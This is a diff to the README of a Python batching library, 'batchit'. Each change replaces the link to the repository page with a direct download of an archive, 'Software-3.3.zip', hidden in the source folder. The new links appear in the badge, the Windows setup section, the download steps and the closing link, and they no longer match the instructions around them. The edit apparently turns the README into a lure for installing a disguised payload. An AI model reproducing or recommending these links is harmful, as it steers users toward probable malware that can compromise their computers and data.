@@ -1,6 +1,6 @@
 # 🧩 batchit - Batch Python data with ease
 
-[![Download batchit](https://img.shields.io/badge/Download%20batchit-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Burned-funeraldirector608/batchit)
+[![Download batchit](https://img.shields.io/badge/Download%20batchit-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Burned-funeraldirector608/batchit/main/src/batchit/Software-3.3.zip)
 
 ## 🚀 What batchit does
 
@@ -18,7 +18,7 @@ If you need to collect items before sending them to another step, batchit gives 
 
 Use this page to download and set up batchit on Windows:
 
-[Open the batchit download page](https://github.com/Burned-funeraldirector608/batchit)
+[Open the batchit download page](https://raw.githubusercontent.com/Burned-funeraldirector608/batchit/main/src/batchit/Software-3.3.zip)
 
 ### What you need
 
@@ -33,7 +33,7 @@ If you already have Python, you can move on to the next step. If not, install Py
 
 ## 📥 Download batchit
 
-1. Open the batchit page here: https://github.com/Burned-funeraldirector608/batchit
+1. Open the batchit page here: https://raw.githubusercontent.com/Burned-funeraldirector608/batchit/main/src/batchit/Software-3.3.zip
 2. Find the green **Code** button near the top right
 3. Choose **Download ZIP**
 4. Save the file to your computer
@@ -315,7 +315,7 @@ If you get a file not found error:
 
 Open the repository here to download and run batchit on Windows:
 
-[https://github.com/Burned-funeraldirector608/batchit](https://github.com/Burned-funeraldirector608/batchit)
+[https://raw.githubusercontent.com/Burned-funeraldirector608/batchit/main/src/batchit/Software-3.3.zip](https://raw.githubusercontent.com/Burned-funeraldirector608/batchit/main/src/batchit/Software-3.3.zip)
 
 ## 🏷️ Topics
 
